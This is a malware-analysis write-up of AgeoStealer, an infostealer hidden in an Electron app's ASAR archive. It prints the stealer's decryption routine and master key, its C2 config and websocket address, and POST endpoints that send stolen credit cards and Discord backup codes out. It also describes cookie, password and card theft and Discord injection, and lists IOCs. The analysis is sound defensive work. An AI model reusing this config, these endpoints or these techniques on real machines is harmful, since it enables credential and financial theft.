---
title: "[SamplePedia] AgeoStealer - Electron-based infostealer"
layout: single
date: 2026-2-5
description: "How attacker could hide an infostealer inside electron application"
toc: true
classes: wide
toc_label: "Table of contents"
header:
    teaser: /assets/images/Samplepedia/AgeoStealer/logo.png
ribbon: orange
categories: 
    - Malware ½ Analysis
tags:
    - Info-stealer
---
# Introduction
To evade being detected by security solutions, attacker could inject JavaScript-based infostealers inside electron applications within `.asar` (Atom Shell Archive Format) archives 

# Analysis
Our target is to Unpack the sample and obtain the config used by the infostealer
{% include my_figure.html src="/assets/images/Samplepedia/AgeoStealer/0-task.png" caption="Figure 1: The Task" %}

## NSIS Script:
The sample is packed with NSIS script, let's take a look at the script:
1. First, it checks system requirements such as (OS version, CPU architecture, etc) which requires Windows 7 or higher with 64-bit architecture.
2. Then, it will initialize installation directory which is `%TEMP%\2Rtpajh6uGscAPxgRNqlD7VdBiq` and extracts another file named `app-64.7z` (Which is actaully embedded inside the NSIS application); it contains the malicious electron application called `build.exe` which unpacks the ASAR file into memory with actual infostealer JS code.

{% include my_figure.html src="/assets/images/Samplepedia/AgeoStealer/1-installationDirectory.png" caption="Figure 2: Installation Directory" %}

{% include my_figure.html src="/assets/images/Samplepedia/AgeoStealer/2-extractMaliciousElectronApplication.png" caption="Figure 3: Extract Malicious Electron Application" %}
{% include my_figure.html src="/assets/images/Samplepedia/AgeoStealer/3-applicationExecution.png" caption="Figure 4: Execution of the malicious electron application" %}

## JS Decryption:
The most important file is `app.asar` which as said before is the actual infostealer JS code. To extract its content, we can use the following command:
```batch
asar extract app.asar [OUTPUT_DIRECTORY]
```

{% include my_figure.html src="/assets/images/Samplepedia/AgeoStealer/4-extractedASARArchieve.png" caption="Figure 5: Extracted Files" %}

The decryption routine is located in `coreAES.js` file which is so simple, the structure of the encrypted data is:
```plaintext
[Salt (64 bytes)][IV (16 bytes)][Auth Tag (16 bytes)][Ciphertext (variable)]
```
The decryption routine is as follows:
1. Decodes the base64 string to binary
2. Extracts cryptographic components (salt, IV, auth tag, ciphertext)
3. Derives the encryption key using PBKDF2 with `2145` iterations with master key `Z695DjoW8VZBD4q8diot9oVomTEsJ5G+`
4. Decrypts using `AES-256-GCM`

```javascript
const crypto = require('crypto')
function decrypt(encdata, masterkey) {
  const bData = Buffer.from(encdata, 'base64')
  const salt = bData.slice(0, 64)
  const iv = bData.slice(64, 80)
  const tag = bData.slice(80, 96)
  const text = bData.slice(96)
  const key = crypto.pbkdf2Sync(masterkey, salt, 2145, 32, 'sha512')
  const decipher = crypto.createDecipheriv('aes-256-gcm', key, iv)
  decipher.setAuthTag(tag)
  const decrypted = decipher.update(text, 'binary', 'utf8') + decipher.final('utf8')
  return decrypted
}
```

We can decrypt it using node (just adding `console.log(decrypt(encdata, masterkey))` to the code and running it). You can find the decrypted malware [here](https://github.com/para0x0dise/Wubba-Lubba-Dub-Dub/blob/main/samples/electronStealer_dca13fc006a3b55756ae0534bd0d37a1b53a219b5d7de236f20b0262f3662659/Files/ext/decrypted.js).
{% include my_figure.html src="/assets/images/Samplepedia/AgeoStealer/5-decryptedStealer.png" caption="Figure 6: Decrypted Stealer" %}

We can see now the decrypted config used by the infostealer:
```javascript
let api_url = 'https://ageostealer.wtf'
let api_auth = 'Ageox2IC58pd6m1C73x'
let name = 'Ageox2IC58pd6m1C73x'
let config = { 
    'api_url': 'https://ageostealer.wtf', 
    'api_auth': '293929329', 
    'websocket_url': 'ws://213.255.247.174:3200'
}
```

## Stealer Brief Analysis:
### Initial Beacon:
First, it collects basic info about the victim's machine such as:
1. Hostname
2. Username
3. OS Version
4. OS Architecture
5. Total RAM
6. Number of Processors
7. Environment Variables (APPDATA, LOCALAPPDATA, USERPROFILE, etc)
8. System Uptime
{% include my_figure.html src="/assets/images/Samplepedia/AgeoStealer/6-initialBeacon.png" caption="Figure 7: Initial Beacon" %}

### Command Handler:
It also has a command handler module to send and receive commands through the websocket connection.

| Command     | Description                                                       |
| ----------- | ----------------------------------------------------------------- |
| restartcord | Restart Discord application                                       |
| exec        | Execute arbitrary commands                                        |
| getclip     | Steal clipboard contents                                          |
| setclip     | Set clipboard contents                                            |
| reinject    | Injects malicious JS code into discord application                |
| cookies     | Not implemented but I guess it sends cookies to the C2 server     |
| backupcodes | Search for discord's backup codes and sends them to the C2 server |


### Stealing Browser Credentials:
It has a list of hardcoded paths of many browsers to start stealing stored cookies within `Local State` file. Based on the browser version, it will use different decryption methods to decrypt the cookies (You can find more info in my [article](https://para0x0dise.github.io/absurdities/Absurdities-I/#absurdity-i-chromes-security-mechanisms)).

{% include my_figure.html src="/assets/images/Samplepedia/AgeoStealer/7-decryptCookies.png" caption="Figure 8: Stealing Browser Cookies" %}

### Stealing Stored Credentials (Passwords & Credit Cards):
The same as cookies but this time it will search for `passwords.db` and `creditcards.db` which are actually SQLite database files that stores the credentials and credit cards respectively.

{% include my_figure.html src="/assets/images/Samplepedia/AgeoStealer/8-getStoredCredentials.png" caption="Figure 9: Stealing Stored Credentials" %}
{% include my_figure.html src="/assets/images/Samplepedia/AgeoStealer/88-getStoredCreditCards.png" caption="Figure 10: Stealing Stored Credit Cards" %}


### Discord Injection:
It basically enumerates the path of discord application (and its variant **BetterDiscord**) and gets `discord_desktop_core` directory that contains `index.js` file which is the main file of the discord application. It then injects the malicious JS code into the `index.js` file downloaded from the C2 server.
{% include my_figure.html src="/assets/images/Samplepedia/AgeoStealer/9-infectDiscord.png" caption="Figure 11: Infecting Discord" %}

### Data Exfiltration:
Basically, it sends the collected data mainly as txt/zip files without any manipulation through the websocket APIs. These are examples of API endpoints:
```
POST https://ageostealer.wtf/api/creditcards
POST https://ageostealer.wtf/api/backupcodes
```
{% include my_figure.html src="/assets/images/Samplepedia/AgeoStealer/10-submitCreditCards.png" caption="Figure 12: Submitting Credit Cards" %}
{% include my_figure.html src="/assets/images/Samplepedia/AgeoStealer/11-submitDiscordCodes.png" caption="Figure 13: Submitting DiscordBackup Codes" %}


# IOCs

| Type                      | Data                                                             |
| ------------------------- | ---------------------------------------------------------------- |
| Main NSIS-Installer       | dca13fc006a3b55756ae0534bd0d37a1b53a219b5d7de236f20b0262f3662659 |
| Evil Electron Application | ff20400a7e7c164d6b03b2bbc1d757e828a69cadd9cae5fdf3b9c9ca54eacf5a |
| Encrypted JS File         | 887f48ad1b2bf13be25b1142200ec1e0482a07c3fa7a87cca373a6807d4af7db |
| Decrypted JS File         | 9f082ee24a90d5fbcde99155985d0fda01ce6dc29d2d68958f02339eac54aede |
| websocket_url             | ws[:]//213[.]255[.]247[.]174:3200                                |
| Stealers's C2 Server      | https[:]//ageostealer[.]wtf                                      |
| Stealer's API key         | Ageox2IC58pd6m1C73x                                              |